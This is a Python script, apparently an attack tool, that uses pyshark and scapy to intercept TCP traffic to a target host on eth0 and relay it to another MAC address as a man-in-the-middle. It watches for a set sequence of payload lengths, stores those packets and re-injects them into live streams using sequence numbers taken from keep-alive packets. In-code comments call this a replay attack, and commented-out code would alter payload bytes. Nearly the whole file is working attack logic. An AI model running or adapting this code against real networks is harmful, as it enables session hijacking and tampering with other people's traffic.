import pyshark
from scapy.all import *
import codecs
import time
import threading
import sys
from random import randint

print("Starting pyshark")
filter = 'dst host IP and tcp dst port PORT and not ether src host xx:xx:xx:xx:xx:xx'

print("Filter: " + filter)

cap = pyshark.LiveCapture(interface='eth0', bpf_filter=filter)

x = 0

#Cache memory for storing packets and control variables
pkts_repeat = []
waiting = -1
started = 0

current_seq = []
current_streams = []
sending = False

keep_alives = []
can_keep = False
stream_needed = None


#MAC addresses
MAC_1 = "xx:xx:xx:xx:xx:xx"
MAC_2 = "xx:xx:xx:xx:xx:xx"
OWN_MAC = "xx:xx:xx:xx:xx:xx"


#For sending packets
def send_fun(pkt,fake_pkt):

	global sending
	
	while sending:
		time.sleep(0.1)

	sending = True
	
	
	
	if fake_pkt == None:
		seq_number = int(pkt.tcp.seq_raw)
		ack_number = int(pkt.tcp.ack_raw)
	else:
		seq_number = int(fake_pkt.tcp.seq_raw)
		ack_number = int(fake_pkt.tcp.ack_raw)

	#pkt.pretty_print()
	
	#There is a data layer
	if len(pkt.layers) > 3:
	
		data = str(pkt.data.data).replace(":","")
		
		#Modifying random bits
#		if len(data) > 2:
#			data = data.replace(data[randint(0,len(data))],random.choice(data),1)
		
		print("Data")
		packet = Ether(src=OWN_MAC, dst=MAC_2) / IP(src=str(pkt.ip.src), dst=str(pkt.ip.dst), ttl=int(pkt.ip.ttl),
			id=int(pkt.ip.id,0), flags=int(pkt.ip.flags,0)) / TCP(sport=int(pkt.tcp.srcport), dport=int(pkt.tcp.dstport), seq=seq_number,
			ack=ack_number, flags=int(pkt.tcp.flags,0)) / Raw(codecs.decode(data,"hex"))	


	#Payload in TCP but no data layer
	elif int(pkt.tcp.len) > 0:
		
		print("TCP Payload")
		packet = Ether(src=OWN_MAC, dst=MAC_2) / IP(src=str(pkt.ip.src), dst=str(pkt.ip.dst), ttl=int(pkt.ip.ttl),
			id=int(pkt.ip.id,0), flags=2) / TCP(sport=int(pkt.tcp.srcport), dport=int(pkt.tcp.dstport), seq=seq_number,
			ack=ack_number, flags=int(pkt.tcp.flags,0)) / Raw(codecs.decode(str(pkt.tcp.payload).replace(":",""),"hex"))


	#No payload at all				
	else:
		packet = Ether(src=OWN_MAC, dst=MAC_2) / IP(src=str(pkt.ip.src), dst=str(pkt.ip.dst), ttl=int(pkt.ip.ttl),
			id=int(pkt.ip.id,0), flags=2) / TCP(sport=int(pkt.tcp.srcport), dport=int(pkt.tcp.dstport), seq=seq_number,
			ack=ack_number, flags=int(pkt.tcp.flags,0))

	
	#packet.show2()
	sendp(packet,iface="eth0")
	
	sending = False
			
			
def repeat_fun(pkts,x):
	global waiting
	global current_seq
	global stream_needed
	
	waiting += 1
	
	time.sleep(1)
	
	while waiting < 1:
		time.sleep(1)
		
	waiting -= 1
		
	print("Finished Waiting")
	
	i=0
	while i < 5:
		stream_needed = int(pkts[i].tcp.stream)
		while len(keep_alives) == 0:
			time.sleep(0.2)
			
		pak_keep = keep_alives.pop()
		
		if current_seq[current_streams.index(int(pak_keep.tcp.stream))] > int(pak_keep.tcp.seq_raw):
			send_fun(pak_keep,None)
			continue
	
		send_fun(pkts[i],pak_keep)
		print("Sent: " + str(i))
		i+=1
		time.sleep(0.5)
	
	print("Packets Sent")	

#When capturing the packet
def catch_pkt(pkt):
	global x
	x = x+ 1
	print(x)
		
	try:
	
		#For slowing 1 by 1
#		if x > 20:
#			print("Sleeping")
#			time.sleep(0.8)
#		
#		send_pkt(pkt,int(pkt.tcp.seq_raw))


		#Storing sequence numbers
		global current_seq
		global current_streams
		
		if int(pkt.tcp.stream) in current_streams:
			current_seq[current_streams.index(int(pkt.tcp.stream))]= int(pkt.tcp.seq_raw)
			
		else:
			current_seq.append(int(pkt.tcp.seq_raw))
			current_streams.append(int(pkt.tcp.stream))

	
		#Storing some keep alives
		global can_keep
		global keep_alives
		global waiting
		global stream_needed
		

		if int(pkt.tcp.len) == 1 and waiting > -1:
			
			if can_keep:
				can_keep = False
				keep_alives.append(pkt)
			else:
				can_keep = True
			
		#Thread
		if not pkt in keep_alives:
			th = threading.Thread(target=send_fun, args=(pkt,None,))		
			th.start()
		
			
		#For specific replaying attacks
		global pkts_repeat		
		global started
		
		if int(pkt.tcp.len) == 224 and started == 0:
			pkts_repeat.append(pkt)
			started = 1

		if int(pkt.tcp.len) == 240 and started == 1:
			pkts_repeat.append(pkt)
			started = 2
			
		if int(pkt.tcp.len) == 224 and started == 2:
			pkts_repeat.append(pkt)
			started = 3
			
		if int(pkt.tcp.len) == 269 and started == 3:
			pkts_repeat.append(pkt)
			started = 4
			
		if int(pkt.tcp.len) == 240 and started == 4:
			pkts_repeat.append(pkt)
			started = 0

			print("Finished!!!")
			
			rep = threading.Thread(target=repeat_fun, args=(pkts_repeat,x,))		
			rep.start()
			pkts_repeat = []
			

		#Gereric replay			
#		pkts_repeat.append(pkt)

#		if x % 10 == 0:
#			print("Sending packets!")
#			print(pkts_repeat)
#			
#			for pack in pkts_repeat:
#				send_pkt(pack,int(pack.tcp.seq_raw))	


		
			
		
		
	except Exception as e:
		print(e)	




print("Started")

cap.apply_on_packets(catch_pkt)







